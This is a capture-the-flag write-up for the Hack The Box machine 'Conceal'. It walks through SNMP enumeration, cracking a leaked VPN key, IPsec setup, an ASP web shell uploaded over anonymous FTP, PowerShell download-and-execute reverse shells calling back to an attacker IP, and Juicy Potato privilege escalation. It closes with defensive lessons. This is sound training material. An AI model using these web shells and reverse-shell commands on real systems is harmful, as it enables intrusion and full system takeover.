# Conceal Writeup w/o Metasploit

![](https://miro.medium.com/max/593/1*UMj8ECCKxnwvcQbJkB2sBw.png)

## Reconnaissance <a id="d0a6"></a>

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```text
./nmapAutomator.sh 10.10.10.116 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
root@kali:~/Desktop/htb/conceal# nmapAutomator.sh 10.10.10.116 AllRunning all scans on 10.10.10.116Host is likely running Windows---------------------Starting Nmap Quick Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 23:19 EST
Nmap done: 1 IP address (1 host up) scanned in 101.60 seconds---------------------Starting Nmap Basic Scan---------------------No ports in quick scan.. Skipping!----------------------Starting Nmap UDP Scan----------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 23:20 EST
Nmap scan report for 10.10.10.116
Host is up (0.051s latency).
Not shown: 999 open|filtered ports
PORT    STATE SERVICE
500/udp open  isakmpNmap done: 1 IP address (1 host up) scanned in 188.61 secondsMaking a script scan on UDP ports: 500Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 23:23 EST
/usr/local/bin/nmapAutomator.sh: line 164:  1941 Segmentation fault      $nmapType -sCVU --script vulners --script-args mincvss=7.0 -p$(echo "${udpPorts}") -oN nmap/UDP_"$1".nmap "$1"---------------------Starting Nmap Full Scan----------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 23:23 EST
Initiating Parallel DNS resolution of 1 host. at 23:23
Completed Parallel DNS resolution of 1 host. at 23:23, 0.02s elapsed
Initiating SYN Stealth Scan at 23:23
Scanning 10.10.10.116 [65535 ports]
Nmap scan report for 10.10.10.116
Host is up.
All 65535 scanned ports on 10.10.10.116 are filteredRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27315.03 seconds
           Raw packets sent: 131070 (5.767MB) | Rcvd: 2 (168B)Making a script scan on all ports
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-24 06:59 EST
Error #486: Your port specifications are illegal.  Example of proper form: "-100,200-1024,T:3000-4000,U:60000-"
QUITTING!---------------------Finished all Nmap scans---------------------
```

We have one open port.

* **Port 500:** running isakmp

Before we move on to enumeration, let’s make some mental notes about the scan results.

* I’m not familiar with the service that is running on port 500. A quick google search tells us that it is the Internet Security Association and Key Management Protocol\( ISAKMP\) which is commonly called Internet Key Exchange \(IKE\). A lot of the documentation references configuring IPsec and ISAKMP standards to build VPNs.
* So there are probably other ports that are open, however, we won’t be able to see them before we establish that VPN connection. In order to do that, we need some kind of key for authentication and since this is an HTB box, we have to find this key somewhere. So what we’ll do is rerun all the nmap scans to see if we missed any ports the first time around.

## Enumeration <a id="2871"></a>

Rerunning the UDP scan does give us an extra port.

```text
root@kali:~# nmap -vvv -sU -sV 10.10.10.116
....
Discovered open port 161/udp on 10.10.10.116
```

Port 161 is open. This usually runs the SNMP service. Let’s check that using nmap.

```text
nmap -p 161 -sU -sC -sV 10.10.10.116
```

* **-p:** port
* **-sU:** UDP scan
* **-sC:** run default scripts
* **-sV:** version detection

We get back the following result.

![](https://miro.medium.com/max/873/1*uZ6_DrTMjU7enGttQNhcKg.png)

The port is running SNMP version 1 and was able to query the service using the default “_public_” community string. We see that there are a bunch of ports that are open including FTP, HTTP and SMB. We won’t get access to these ports until we establish a secure connection.

For now, we can only interact with the SNMP and ISAKMP ports. Let’s first query SNMP for any sensitive information.

```text
snmpwalk -c public -v 1 10.10.10.116 > snmp-public.txt
```

* **-c:** community string
* **-v:** SNMP version

We get back the following result.

```text
root@kali:~/Desktop/htb/conceal# cat snmp-public.txt iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: AMD64 Family 23 Model 1 Stepping 2 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)"                
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.311.1.1.3.1.1                                                                                                                         
iso.3.6.1.2.1.1.3.0 = Timeticks: (305519) 0:50:55.19                                                                                                                           
iso.3.6.1.2.1.1.4.0 = STRING: "IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43"                                                                                        
iso.3.6.1.2.1.1.5.0 = STRING: "Conceal"                                                                                                                                        
iso.3.6.1.2.1.1.6.0 = ""                                                                                                                                                       
iso.3.6.1.2.1.1.7.0 = INTEGER: 76
iso.3.6.1.2.1.2.1.0 = INTEGER: 15
iso.3.6.1.2.1.2.2.1.1.1 = INTEGER: 1
```

It leaks the IKE VPN password hash!

```text
root@kali:~# echo -n 9C8B1A372B1878851BE2C097031B6E43 | wc -c
32
```

This looks like an MD5 hash. Let’s use the [CrackStation](https://crackstation.net/) to crack it.

![](https://miro.medium.com/max/894/1*-yCPGVP92izJ5pSCKrSvQw.png)

Now that we have a plaintext password, let’s try and establish a connection to the VPN.

First run _ike-scan_ to determine the IKE implementation and configuration that the host is using.

```text
ike-scan -M 10.10.10.116
```

* **-M:** multiline

We get back the following result.

![](https://miro.medium.com/max/1172/1*JuIqr2xdr61RyrjVy3sLcA.png)

Next, we’ll use _strongswan_ to establish the IPsec connection. This does not come preinstalled on Kali. To install it, run the following command.

```text
apt-get install strongswan
```

We have to make changes to two files: _ipsec.secrets_ and _ipsec.conf_.

In the _/etc/ipsec.secrets_, add the following entry.

```text
10.10.14.7 10.10.10.116 : PSK "Dudecake1!"
```

In the _/etc/ipsec.conf_, add the following entry.

```text
conn conceal                                                                                                                                                                                             
        authby=secret                                                                                                                                                                                    
        auto=route                                                                                                                                                                                       
        keyexchange=ikev1                                                                                                                                                                                
        ike=3des-sha1-modp1024                                                                                                                                                                           
        left=10.10.14.7                                                                                                                                                                                  
        right=10.10.10.116                                                                                                                                                                               
        type=transport                                                                                                                                                                                   
        esp=3des-sha1                                                                                                                                                                                    
        rightprotoport=tcp
```

Then run the following command to establish the connection.

```text
root@kali:~# ipsec up concealgenerating QUICK_MODE request 1899279807 [ HASH SA No ID ID ]
sending packet: from 10.10.14.7[500] to 10.10.10.116[500] (196 bytes)
received packet: from 10.10.10.116[500] to 10.10.14.7[500] (188 bytes)
parsed QUICK_MODE response 1899279807 [ HASH SA No ID ID ]
selected proposal: ESP:3DES_CBC/HMAC_SHA1_96/NO_EXT_SEQ
detected rekeying of CHILD_SA conceal{32}
CHILD_SA conceal{33} established with SPIs cea2f2d0_i fbdc1ee6_o and TS 10.10.14.7/32 === 10.10.10.116/32[tcp]
generating QUICK_MODE request 1899279807 [ HASH ]
connection 'conceal' established successfully
```

Perfect, the connection was established successfully. Now let’s try and run an nmap scan.

```text
root@kali:~/Desktop/htb/conceal# nmap 10.10.10.116
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-28 00:24 EST
Nmap scan report for 10.10.10.116
Host is up (0.047s latency).
All 1000 scanned ports on 10.10.10.116 are filteredNmap done: 1 IP address (1 host up) scanned in 49.03 seconds
```

The default TCP SYN scan \(-sS\) does not seem to work, but a TCP connect scan does.

```text
root@kali:~/Desktop/htb/conceal# nmap -sT 10.10.10.116
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-28 00:26 EST
Nmap scan report for 10.10.10.116
Host is up (0.042s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
80/tcp  open  http
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-dsNmap done: 1 IP address (1 host up) scanned in 2.65 seconds
```

I have no idea why you would need a TCP connect scan for it to work. However, in the interest of moving forward, let’s run a more comprehensive TCP connect scan.

```text
root@kali:~/Desktop/htb/conceal# nmap -sC -sV -sT -o nmap-vpn.text 10.10.10.116Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-27 20:39 EST
Nmap scan report for 10.10.10.116
Host is up (0.041s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE       VERSION
21/tcp  open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:
|_clock-skew: 2m18s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-02-28T01:41:47
|_  start_date: 2020-02-27T01:56:42Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.89 seconds
```

## More Enumeration <a id="cc3e"></a>

I always start off with enumerating HTTP.

### **Port 80 HTTP** <a id="51c9"></a>

Visit the application in the browser.

![](https://miro.medium.com/max/1188/1*ViKiH2tFT9AIJ-vaKESWOA.png)

We get the default Windows Microsoft IIS welcome page. The page source doesn’t contain any sensitive information.

Next, run gobuster to enumerate directories/files.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.116 -o gobuster.txt
```

* **dir:** directory mode
* **-w:** wordlist
* **-u:** URL
* **-o:** output file

We get back the following result.

![](https://miro.medium.com/max/1063/1*2Erei0XdUfVqC43MC4v8JQ.png)

Visit the directory in the browser.

![](https://miro.medium.com/max/612/1*pOD8gN3ZrDqL-9lepXJw3g.png)

It doesn’t contain anything. Let’s see if we can upload files through FTP.

### **Port 21 FTP** <a id="9ba0"></a>

The nmap scan showed anonymous login is allowed.

```text
root@kali:~/Desktop/htb/conceal/upload# ftp 10.10.10.116Connected to 10.10.10.116.
220 Microsoft FTP Service
Name (10.10.10.116:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp>
```

Let’s test if we’re allowed to upload files. Create a _test.txt_ file on the attack machine.

```text
echo "hello" > test.txt
```

Upload the _test.txt_ file on the FTP server.

```text
ftp> put test.txt                                                                    
local: test.txt remote: test.txt                                                     
200 PORT command successful.                                                         
125 Data connection already open; Transfer starting.                                 
226 Transfer complete.                                                               
7 bytes sent in 0.00 secs (78.5740 kB/s)
```

The upload was successful. Let’s see if we can execute the file from the _/upload_ directory on the web server.

![](https://miro.medium.com/max/614/1*IsQ9pz_uu4uAFyAEw-PyFA.png)

Perfect! According to the nmap scan, this is a Microsoft IIS server version 10, so it should be able to execute ASP and ASPX code. Let’s test this out on the web server.

Create a _test.aspx_ file on the attack machine and upload it on the FTP server in the same way we did before. Then execute the file from the _/upload_ directory on the web server.

![](https://miro.medium.com/max/1017/1*CC08xJvj5SbdzlQyyJaUng.png)

We get an HTTP error saying that the file can’t be served because of the extension configuration. So we can’t upload ASPX files. Next, let’s try an ASP file.

Create a _test.asp_ file on the attack machine and upload it on the FTP server in the same way we did before. Then execute the file from the _/upload_ directory on the web server.

![](https://miro.medium.com/max/563/1*JXvfQMesSBnzSHoEZGugLA.png)

Perfect, it does execute ASP code! We’ll use this to gain an initial foothold on the system.

## Initial Foothold <a id="22c8"></a>

Create a _cmd.asp_ file on the attack machine that contains the following simple web shell.

```text
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c whoami")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

The above code executes the _whoami_ command and outputs it on the screen. Upload the _cmd.asp_ file on the FTP server and view it on the browser.

![](https://miro.medium.com/max/798/1*jumMYZLn6cHZhJmXlkwH5A.png)

We have code execution! Download the [Nishang](https://github.com/samratashok/nishang) repository and copy the _Invoke-PowerShellTcp.ps1_ script into your current directory.

```text
cp ../../../tools/nishang/Shells/Invoke-PowerShellTcp.ps1 .
mv Invoke-PowerShellTcp.ps1 shell.ps1
```

Add the following line to the end of the script with the attack machine configuration settings.

```text
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 1234
```

When called, this sends a reverse shell back to our attack machine on port 1234.

Setup a listener to receive the reverse shell.

```text
nc -nlvp 1234
```

Next, change the _cmd.asp_ file to download the PowerShell script and execute it.

```text
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.7:5555/shell.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

Start up a python server in the directory that the shell script resides in.

```text
python -m SimpleHTTPServer 5555
```

Upload the _cmd.asp_ file on the FTP server and view it on the browser.

![](https://miro.medium.com/max/801/1*zHVh8nxaQxjprpyKmSHDOw.png)

We get a shell! Grab the _user.txt_ flag.

![](https://miro.medium.com/max/650/1*elQ-E-q4GYfsIhvY5kKZ4A.png)

## Privilege Escalation <a id="90be"></a>

Run the _systeminfo_ command.

```text
PS C:\Users\Destitute\Desktop> systeminfo
                                                                                                                     
Host Name:                 CONCEAL                                                                                   
OS Name:                   Microsoft Windows 10 Enterprise                                                                                  
OS Version:                10.0.15063 N/A Build 15063                                                                                       
OS Manufacturer:           Microsoft Corporation                                                                                            
OS Configuration:          Standalone Workstation                                                                                           
OS Build Type:             Multiprocessor Free                                                                                                              
Registered Owner:          Windows User                                                                                                                     
Registered Organization:                                                                                                                                                       
Product ID:                00329-00000-00003-AA343                                                                                                                             
Original Install Date:     12/10/2018, 20:04:27                                                                                                                                
System Boot Time:          27/02/2020, 01:56:19                                                                                                                                
System Manufacturer:       VMware, Inc.                                                                                                                                        
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-gb;English (United Kingdom)
Input Locale:              en-gb;English (United Kingdom)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,154 MB
Virtual Memory: Max Size:  3,199 MB
Virtual Memory: Available: 2,213 MB
Virtual Memory: In Use:    986 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.116
                                 [02]: fe80::4e1:f9b6:e5da:2f16
                                 [03]: dead:beef::71d9:f571:4c90:5dc7
                                 [04]: dead:beef::18b2:9ba4:e093:98b9
                                 [05]: dead:beef::4e1:f9b6:e5da:2f16
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

We’re on a Microsoft Windows 10 Enterprise 64-bit OS. Let’s first check the system privileges that are enabled for this user.

![](https://miro.medium.com/max/966/1*kjcJF1T-lm39Ew1tTfxg-Q.png)

_SetImpersonatePrivilege_ is enabled so we’re very likely to get SYSTEM using [Juicy Potato](https://github.com/ohpe/juicy-potato). Users running the SQL server service or the IIS service usually have these privileges enabled by design. This privilege is designed to allow a service to impersonate other users on the system. Juicy Potato exploits the way Microsoft handles tokens in order to escalate local privileges to SYSTEM.

Let’s test it out. Grab the Juicy Potato executable from [here](https://github.com/ohpe/juicy-potato/releases) and transfer it to the target machine using the following command.

```text
(new-object net.webclient).downloadfile('http://10.10.14.7:5555/JuicyPotato.exe', 'C:\Users\Destitute\Desktop\jp.exe')
```

Run the executable file to view the arguments it takes.

![](https://miro.medium.com/max/942/1*MXutASCD9YtJArLqrfz0Tg.png)

It requires 3 mandatory arguments.

* **-t:** Create process call. For this option we’ll use \* to test both options.
* **-p:** The program to run. We’ll need to create a file that sends a reverse shell back to our attack machine.
* **-l:** COM server listen port. This can be anything. We’ll use 4444.

First copy the _Invoke-PowerShellTcp.ps1_ script once again into your current directory.

```text
cp ../../../tools/nishang/Shells/Invoke-PowerShellTcp.ps1 .
mv Invoke-PowerShellTcp.ps1 shell-2.ps1
```

Add the following line to the end of the script with the attack configuration settings.

```text
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 6666
```

When called, this sends a reverse shell back to our attack machine on port 6666.

Next, create a _shell.bat_ file that downloads the above _shell-2.ps1_ PowerShell script and runs it.

```text
powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.7:5555/shell-2.ps1')
```

Then download the _shell.bat_ file on the target machine.

```text
(new-object net.webclient).downloadfile('http://10.10.14.7:5555/shell.bat', 'C:\Users\merlin\Desktop\shell.bat')
```

Setup a listener on the attack machine to receive the reverse shell.

```text
nc -nlvp 6666
```

Then run the Juicy Potato executable. This should attempt to get a token that impersonates SYSTEM and then run our _shell.bat_ file with elevated privileges.

```text
PS C:\Users\Destitute\Desktop> ./jp.exe -t * -p shell.bat -l 4444
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 4444
COM -> recv failed with error: 10038
```

It fails to escalate privileges with the default CLSID. We can get the list of CLSIDs on our system using [this script](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). However, let’s first manually try one of the Windows 10 Enterprise CLSIDs available on the Juicy Potato [github repo](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise).

![](https://miro.medium.com/max/943/1*U4HIsLXdLBxuUF0uM8YuYw.png)

Rerun the Juicy Potato executable with the above specific CLSID.

```text
PS C:\Users\Destitute\Desktop> ./jp.exe -p shell.bat -l 4444 -t * -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
Testing {e60687f7-01a1-40aa-86ac-db1cbf673334} 4444
......
[+] authresult 0
{e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\SYSTEM[+] CreateProcessWithTokenW OK
```

We get a shell back with SYSTEM privileges!

```text
root@kali:~# nc -nlvp 6666
listening on [any] 6666 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.116] 49720
Windows PowerShell running as user CONCEAL$ on CONCEAL
Copyright (C) 2015 Microsoft Corporation. All rights reserved.PS C:\Windows\system32>whoami
nt authority\system
```

Grab the _root.txt_ flag.

![](https://miro.medium.com/max/773/1*wrgTg1a8biAroZNnFerpMQ.png)

## Lessons Learned <a id="3860"></a>

To gain an initial foothold on the box we exploited three vulnerabilities.

1. Outdated version of SNMP and the use of default SNMP community string. The community string essentially acts as a password to gain access to the service. Using the default “public” string, we were able to query SNMP for the IKE VPN hashed password. The administrator should have instead used SNMPv3 since it’s the only version that provides strong authentication and data encryption. If it is necessary that version 1 be used, the administrator should have changed the community string to one that is not easily guessable.
2. Weak authentication credentials. The shared secret used to establish a secure connection was cracked in a matter of seconds using an online password cracker. The administrator should have either used a stronger shared key that is difficult to crack or considered using asymmetric encryption.
3. Insecure configuration of FTP server that allowed anonymous login and file upload. The administrator should have disabled anonymous access to the FTP server. If anonymous access was necessary, the administrator should have configured the FTP server to only allow downloads. This way we would not have been able to upload a reverse shell.

To escalate privileges we didn’t necessarily exploit a vulnerability but an intended design of how Microsoft handles tokens. So there’s really not much to do there but put extra protections in place for these sensitive accounts.

